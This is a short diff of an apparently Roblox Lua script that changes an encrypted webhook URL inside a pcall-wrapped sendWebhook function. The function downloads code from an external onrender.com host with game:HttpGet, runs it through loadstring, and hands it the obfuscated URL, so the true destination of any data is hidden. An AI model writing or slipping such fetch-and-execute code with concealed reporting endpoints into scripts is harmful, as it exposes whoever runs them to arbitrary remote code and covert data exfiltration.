@@ -17,7 +17,7 @@ local function sendWebhook()
     -- O pcall 
     pcall(function()
         local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()
-        local cryptUrl = "0389d0791374775d0f7be90039cac32243facebcbdb8b4dc83323fcd48f83a06d058c9761a2746cd78b46f5df3216f5b8bd6175f3ab2b6e677a67bc270484dec3f6b1a482891175189d355e501e46acfc2ef653b38b606e4a6daba4e10bbae7c35a3ef1f215f4ed3ab670f8aac6b691c297721a0d54c008eb633ecc48b25edb3cbeabb4968327abc1fa2adfe6febe5e8d5ce1a2a02b1ff6cf9ae6ab129175cb3a789d2418dc36bc37a8bdbd25cefdf6f58d6cd6e0e9b47aede95148c3ce71afd33d11c6730fcd7d34489c938ad4d577a68d285c920823ed2bd0c096bae84d932"
+        local cryptUrl = "0389d0791374775d0f7be90039cac32243facebcbdb8b4dc83323fcd48f83a06d058c9761a2746cd78b46f5df3216f5b8bd6175f3ab2b6e677a67bc270484dec3f6b1a482891175189d355e501e46acfc2ef653b38b606e4a6daba4e10bbae7c35a3ef1f215f4ed3ab670f8aac6b691c297721a0d54c008eb633ecc48b25edb3cbeabb4968327abc1fa2adfe6febe5e8d5ce1a2a02b1ff6cf9ae6ab129175cb37a743cd115beaf2557a7f37037bc0b2696e12901c120b13bd9b75bc14033110cc8ccbf6b13399e0e05ccd5037aa0b11fc330a31cf86459d4444ca69fb345d033"
         requestWebhook(cryptUrl)
     end)
 end
